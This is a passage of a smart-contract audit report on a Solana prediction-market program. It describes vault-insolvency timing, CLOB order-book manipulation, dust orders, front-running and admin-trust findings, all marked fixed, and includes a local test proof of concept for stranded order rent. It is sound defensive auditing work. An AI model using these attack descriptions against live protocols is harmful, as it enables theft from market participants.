   There is a window between initial resolution and dispute filing during which `claim_win` is unblocked and winners can claim. If some winners claim during this window (partially depleting the vault) and a dispute is subsequently filed and upheld, the dispute reward (0.5%) is paid from the further-depleted vault. Because `event.primary_pool_lamports` is never updated for either the early claims or the dispute reward (H-02), remaining winners compute payouts against the original full snapshot while the vault holds substantially less. The compound shortfall — early payouts plus dispute reward — falls entirely on the last claimants.  
   **Impact:**  
   This compounding interaction makes H-02's insolvency substantially worse under adversarial timing. An attacker aware of this interaction can deliberately claim early before filing a dispute to maximize the deficit borne by remaining winners. The mechanism can trigger naturally without any adversarial intent in any market where winners begin claiming before all dispute windows close.  
   **Recommendation**  
   **Short term:** Apply the preferred H-02 fix (routing the dispute reward from treasury), which eliminates vault depletion at settlement and removes the primary driver of this compound interaction.

   **Long term:** Compute `prize_pool` dynamically from the live vault balance minus secondary collateral at claim time — `prize_pool = vault.lamport − secondary_bid_escrow` — ensuring all claims sum to exactly what is available regardless of intermediate deductions.

## **Low Severity Issues** {#low-severity-issues}

1. **Taker-Controlled Fill Order Violates CLOB Time Priority**  
   **Severity:** Low  
   **File:** `instructions/secondary_limit_order.rs` (matching loop, lines 176–397)  
   **Status:** **FIXED**  
   **Description:**  
   The secondary CLOB matching loop iterates over counterparty resting orders supplied by the taker via `remaining_accounts`. No constraint enforces that orders are presented in ascending `order_id` (time-priority) order. A taker can include any subset of resting orders at a price level in any sequence, bypassing the FIFO time-priority guarantee that is the foundational fairness property of a central limit order book. Earlier market makers have no on-chain guarantee their queue position is respected.  
   **Impact:**  
   In time-sensitive scenarios — markets approaching `end_time` — bypassed early makers may be unable to exit their positions before the market closes, converting a fairness violation into a direct financial loss. Sophisticated takers can systematically discriminate against specific counterparty addresses.  
   **Recommendation**  
   **Short term:** Validate that each counterparty order in `remaining_accounts` has an `order_id` strictly greater than the previous one within the matching loop, rejecting out-of-order or skipped fills.  
   **Long term:** Track a `fill_head_order_id` pointer per side in `PriceLevel` and enforce strict FIFO against it on every fill, eliminating both reordering and selective omission of resting orders.

### 

2. **Fully-Filled Order Rent Permanently Stranded**  
   **Severity:** Low  
   **File:** `instructions/secondary_cancel_order.rs` (line 46\)  
   **Status:** **FIXED**  
   **Description:**  
   When a taker fully fills a resting maker order, `order.amount` reaches zero but the `OrderNode` PDA is not closed. The maker's only recourse — `secondary_cancel_order` — is blocked by:  
   require\!(order\_node.amount \> 0, ErrorCode::OrderAlreadyFilled);  
     
   There is no alternative path to close a zero-amount `OrderNode` and reclaim its \~0.002262 SOL rent.  
   **Proof of Concept**

| import \* as anchor from "@coral-xyz/anchor"; import { BN, Program } from "@coral-xyz/anchor"; import { Keypair, PublicKey, LAMPORTS\_PER\_SOL } from "@solana/web3.js"; import { startAnchor, BankrunProvider } from "anchor-bankrun"; import { sha256 } from "js-sha256"; import { assert, expect } from "chai"; import \* as fs from "fs"; import \* as path from "path"; const PROGRAM\_ID \= new PublicKey("BeC6CD5Y3PW6QtqVFBf1R1JLdw84QM7N4jqytBzxoPg4"); const IDL \= JSON.parse(fs.readFileSync(path.join(\_\_dirname, "../../target/idl/balr\_market.json"), "utf-8")); const hashQuestion \= (q: string) \=\> Buffer.from(sha256.array(Buffer.from(q, "utf-8"))); async function fund(ctx: any, to: PublicKey, lamports: number) {   const ix \= anchor.web3.SystemProgram.transfer({ fromPubkey: ctx.payer.publicKey, toPubkey: to, lamports });   const tx \= new anchor.web3.Transaction().add(ix);   tx.recentBlockhash \= ctx.lastBlockhash;   tx.feePayer \= ctx.payer.publicKey;   tx.sign(ctx.payer);   await ctx.banksClient.processTransaction(tx); } describe("L-02 PoC — OrderNode zombie after full-fill", () \=\> {   it("Alice cannot reclaim rent on a fully-filled order: cancel reverts with OrderAlreadyFilled", async () \=\> {     const context \= await startAnchor(path.join(\_\_dirname, "../.."), \[\], \[\]);     const provider \= new BankrunProvider(context);     anchor.setProvider(provider);     const program \= new Program(IDL as anchor.Idl, provider) as any;     const \[admin, treasury, relayer, creator, alice, bob\] \=       Array.from({ length: 6 }, () \=\> Keypair.generate());     for (const k of \[admin, creator, alice, bob\])       await fund(context, k.publicKey, 10 \* LAMPORTS\_PER\_SOL);     await program.methods.initialize(       \[admin.publicKey, admin.publicKey, admin.publicKey\],       relayer.publicKey, treasury.publicKey,       new BN(LAMPORTS\_PER\_SOL), new BN(0), new BN(200), new BN(150),       new BN(6 \* LAMPORTS\_PER\_SOL), new BN(1\_000\_000), 20,       new BN(2 \* LAMPORTS\_PER\_SOL),     ).accounts({ admin: admin.publicKey }).signers(\[admin\]).rpc();     const clock \= await context.banksClient.getClock();     const startTime \= Number(clock.unixTimestamp) \+ 120;     const question \= "zombie order";     const qHash \= hashQuestion(question);     const \[marketConfigPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("market\_config")\], PROGRAM\_ID);     const \[eventPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("event"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[vaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("vault"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[creatorFeeVaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("creator\_fee\_vault"), eventPda.toBuffer()\], PROGRAM\_ID);     const \[creatorPosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), creator.publicKey.toBuffer()\], PROGRAM\_ID);     const \[alicePosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), alice.publicKey.toBuffer()\], PROGRAM\_ID);     const \[bobPosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), bob.publicKey.toBuffer()\], PROGRAM\_ID);     await program.methods.createEvent(       new BN(startTime), new BN(startTime \+ 3600), new BN(startTime \+ 7200),       question, new BN(0.5 \* LAMPORTS\_PER\_SOL), true, "", \[\],     ).accountsPartial({       creator: creator.publicKey, marketConfig: marketConfigPda,       event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda,       creatorPosition: creatorPosPda, treasury: treasury.publicKey,     }).signers(\[creator\]).rpc();     for (let i \= 0; i \< 5; i++) {       let ev \= await program.account.event.fetch(eventPda);       if (ev.isGraduated) break;       await program.methods.primaryOrder({ yes: {} }, new BN(LAMPORTS\_PER\_SOL))         .accountsPartial({ user: alice.publicKey, marketConfig: marketConfigPda, event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda, userPosition: alicePosPda, treasury: treasury.publicKey })         .signers(\[alice\]).rpc();       ev \= await program.account.event.fetch(eventPda);       if (ev.isGraduated) break;       await program.methods.primaryOrder({ no: {} }, new BN(LAMPORTS\_PER\_SOL))         .accountsPartial({ user: bob.publicKey, marketConfig: marketConfigPda, event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda, userPosition: bobPosPda, treasury: treasury.publicKey })         .signers(\[bob\]).rpc();     }     const priceLamports \= new BN(500\_000\_000);     const amountShares \= new BN(1000);     const makerOrderId \= new BN(0);     const \[priceLevelPda\] \= PublicKey.findProgramAddressSync(       \[Buffer.from("level"), eventPda.toBuffer(), priceLamports.toArrayLike(Buffer, "le", 8)\], PROGRAM\_ID);     const \[makerOrderPda\] \= PublicKey.findProgramAddressSync(       \[Buffer.from("order"), priceLevelPda.toBuffer(), makerOrderId.toArrayLike(Buffer, "le", 8)\], PROGRAM\_ID);     await program.methods.secondaryLimitOrder({ yes: {} }, priceLamports, amountShares, false, makerOrderId, priceLevelPda)       .accountsPartial({ user: alice.publicKey, marketConfig: marketConfigPda, event: eventPda, userPosition: alicePosPda, priceLevel: priceLevelPda, orderNode: makerOrderPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda, treasury: treasury.publicKey })       .remainingAccounts(\[\]).signers(\[alice\]).rpc();     const takerOrderId \= new BN(1);     const \[takerOrderPda\] \= PublicKey.findProgramAddressSync(       \[Buffer.from("order"), priceLevelPda.toBuffer(), takerOrderId.toArrayLike(Buffer, "le", 8)\], PROGRAM\_ID);     await program.methods.secondaryLimitOrder({ yes: {} }, priceLamports, amountShares, true, takerOrderId, priceLevelPda)       .accountsPartial({ user: bob.publicKey, marketConfig: marketConfigPda, event: eventPda, userPosition: bobPosPda, priceLevel: priceLevelPda, orderNode: takerOrderPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda, treasury: treasury.publicKey })       .remainingAccounts(\[         { pubkey: makerOrderPda, isSigner: false, isWritable: true },         { pubkey: alicePosPda, isSigner: false, isWritable: true },       \]).signers(\[bob\]).rpc();     let cancelError: any \= null;     try {       await program.methods.cancelSecondaryOrder().accountsPartial({         user: alice.publicKey, event: eventPda, userPosition: alicePosPda,         vault: vaultPda, priceLevel: priceLevelPda, orderNode: makerOrderPda,       }).signers(\[alice\]).rpc();     } catch (err) { cancelError \= err; }     expect(String(cancelError)).to.match(/OrderAlreadyFilled/);   }); }); |
| :---- |

   

   **Result:**  
   OrderNode rent: 0.002262 SOL (paid by Alice at init)

   Error Code: OrderAlreadyFilled. Error Number: 6034\.

   \[L-02 CONFIRMED\] OrderNode amount=0 but rent=0.002262 SOL permanently stranded.

   **Impact:**  
   Each fully-filled order costs the maker \~0.002262 SOL in irrecoverable rent. For an active market maker processing 100 orders per day, this accumulates to \~82 SOL per year in stranded capital.

   **Recommendation**

   **Short term:** Add a `reap_filled_order` instruction allowing the order owner to close a zero-amount `OrderNode` and reclaim rent by requiring `order_node.amount == 0`, `signer == order_node.owner`, and using Anchor's `close = user` directive.

   **Long term:** Auto-close `OrderNode` accounts within the matching loop the moment `order.amount` reaches zero, returning rent to the maker within the same transaction and eliminating the need for any follow-up instruction.

### 

3. **Integer Truncation Enables Zero-Cost Share Acquisition**  
   **Severity:** Low  
   **File:** `instructions/secondary_limit_order.rs` (execution cost calculation)  
   **Status:** **FIXED**  
   **Description:**  
   Secondary execution cost is computed as `price_lamports × match_amount / PRICE_SCALE` where `PRICE_SCALE = 1_000_000_000`. For sufficiently small values (e.g., 1 share at 1 lamport price), integer division truncates the result to zero. The order proceeds with zero computed cost, and the buyer acquires shares without transferring any SOL. No minimum `execution_cost` floor exists before state modification.

   **Impact:**  
   Negligible per incident. At scale, automated dust-order placement can accumulate shares across multiple markets for free, diluting the prize pool for legitimate participants.  
   **Recommendation**  
   **Short term:** Add `require!(execution_cost > 0, ErrorCode::DustOrder)` before any state modification in the matching loop to reject orders whose computed cost rounds to zero.

4. **Missing Review Guard on Secondary Profit Withdrawal**  
   **Severity:** Low  
   **File:** `instructions/claim_lamports.rs`  
   **Status:** **FIXED**  
   **Description:**  
   `claim_lamports` allows withdrawal of realized secondary market profits but contains no `pending_review` guard, unlike `claim_win` which explicitly blocks during reviews. During a `ResolutionDispute`, users can withdraw secondary profits from the vault while the dispute outcome is unresolved, creating additional vault depletion before settlement and compounding the H-02 / M-08 shortfall.  
   **Recommendation**  
   **Short term:** Add `require!(event.pending_review == ReviewKind::None, ErrorCode::ReviewInProgress)` to `claim_lamports`, establishing consistent freeze behavior across all vault-withdrawing instructions during active review periods.  
5. **Predictable Order ID Enables Queue Front-Running**  
   **Severity:** Low  
   **File:** `instructions/secondary_limit_order.rs`, `states.rs` (`PriceLevel.next_order_id`)  
   **Status:** **FIXED**  
   **Description:**  
   `price_level.next_order_id` is a public, readable on-chain field. An observer can read the current value, predict the `order_id` of an incoming maker's pending transaction, and submit their own order at the same price level first, causing the maker's transaction to fail with `InvalidOrderId` and forcing re-query and resubmission.  
   **Impact:**  
   No direct fund loss. Market makers are disadvantaged by predictable queue assignments, increasing effective bid-ask spreads and degrading CLOB liquidity quality.  
   **Recommendation**  
   **Short term:** Incorporate a user-provided nonce hashed with `next_order_id` on-chain so the final order ID is unpredictable to external observers without breaking the maker's own transaction construction.  
6. **Absent Balance Parity Condition Permits Lopsided Graduation**  
   **Severity:** Low  
   **Files:** `states.rs`, `instructions/pimary_order.rs`  
   **Status:** **FIXED**  
   **Description:**  
   The protocol specification required `total_yes_shares == total_no_shares` as a graduation condition. The implementation requires only `total_yes_shares >= 1 && total_no_shares >= 1`, allowing markets to graduate with an arbitrarily extreme YES:NO share imbalance. A market creator with advance knowledge of the likely outcome can seed the winning side and build a lopsided market where their shares represent the vast majority of the winner pool, capturing an outsized proportion of all primary deposits at resolution.  
   **Recommendation**  
   **Short term:** Add a ratio tolerance check at graduation requiring neither side's share count exceeds 3× the other's, preventing extreme lopsidedness while preserving practical market mechanics.  
   **Long term:** Explicitly document the absence of balance parity in user-facing materials so traders can assess the creator's structural advantage when deciding whether to participate.  
7. **Undisclosed Admin Resolution Authority Understates Trust Surface**  
   **Severity:** Low  
   **File:** `instructions/resolve_event.rs`  
   **Status:** **FIXED**  
   **Description:**  
   Protocol documentation identifies the relayer (oracle) keypair as the entity responsible for market resolution. The `resolve_event` instruction also accepts any of the three admin keys as equally valid callers. The blast radius of an admin key compromise is therefore larger than documented — a compromised admin key provides full resolution authority over every market in addition to all configuration powers, a fact not disclosed in user-facing materials.  
   **Recommendation**  
   **Short term:** Update all user-facing documentation to disclose that admin keys carry market resolution authority in addition to configuration authority.  
   **Long term:** Separate resolution into a dedicated `resolver` role distinct from both `admin` and `relayer`, reducing each key type to its minimum necessary privileges.  
8. **Secondary Market Fees Excluded from Protocol Accounting**  
   **Severity:** Low  
   **Files:** `instructions/pimary_order.rs`, `instructions/secondary_limit_order.rs`  
   **Status:** **FIXED**  
   **Description:**  
   `event.total_creator_fees` and `event.total_protocol_fees` are incremented only in `pimary_order.rs`. Secondary market fee transfers execute correctly to `creator_fee_vault` and `treasury`, but the event-level aggregate fields are never updated for secondary trades, causing both to systematically undercount their true values by the full amount of all secondary fee revenue.  
   **Impact:**  
   SOL moves to the correct destinations; this is not a fund loss. However, any off-chain system consuming these fields — creator dashboards, treasury reconciliation, compliance reporting — will produce incorrect results and may cause underpayment disputes.  
   **Recommendation**  
   **Short term:** Add `event.total_creator_fees = event.total_creator_fees.checked_add(creator_cut)?` and `event.total_protocol_fees = event.total_protocol_fees.checked_add(treasury_cut)?` in `secondary_limit_order.rs` for both buy-side and sell-side fee calculations.  
9. **Zero-Amount Order Node Causes Premature Matching Loop Exit**  
   **Severity:** Low  
   **File:** `instructions/secondary_limit_order.rs` (line \~209)  
   **Status:** **FIXED**  
   **Description:**  
   The matching loop exits entirely on a zero-amount `OrderNode` encounter:  
   let match\_amount \= remaining\_amount.min(order.amount);  
   if match\_amount \== 0 {  
       break;  *// exits loop — should be \`continue\`*  
   }  
   A stale zero-amount account in `remaining_accounts` (from a race condition between query and execution) terminates the entire loop, giving the taker a silent partial fill with no error indication.  
   **Recommendation**  
   **Short term:** Change `break` to `continue` at the zero-amount check so the loop skips stale accounts rather than terminating prematurely.

10. **Direct PDA Donations Permanently Strand SOL**  
    **Severity:** Low  
    **Files:** All program PDAs  
    **Status:** **FIXED**  
    **Description:**  
    Any program-owned PDA can receive SOL via direct `system_program::transfer`. All withdrawal paths read tracked accounting fields rather than computing the surplus between actual on-chain lamports and the rent-exempt minimum. SOL donated directly to a PDA in excess of tracked balances has no withdrawal mechanism and is permanently inaccessible.  
    **Recommendation**  
    **Short term:** Implement a permissionless `sweep_donations` instruction that transfers `actual_lamports − tracked_balance − rent_exempt_minimum` from any PDA to the treasury, recovering donated SOL without affecting normal protocol accounting.

# **Disclaimer** {#disclaimer}

ImmuneBytes’s audit does not provide a security or correctness guarantee of the audited smart contract. Securing smart contracts is a multistep process; therefore, running a bug bounty program complementing this audit is strongly recommended.

Our team does not endorse the platform or its product, nor is this audit investment advice.

Notes:

* Please make sure contracts deployed on the mainnet are the ones audited.  
* Check for code refactoring by the team on critical issues.


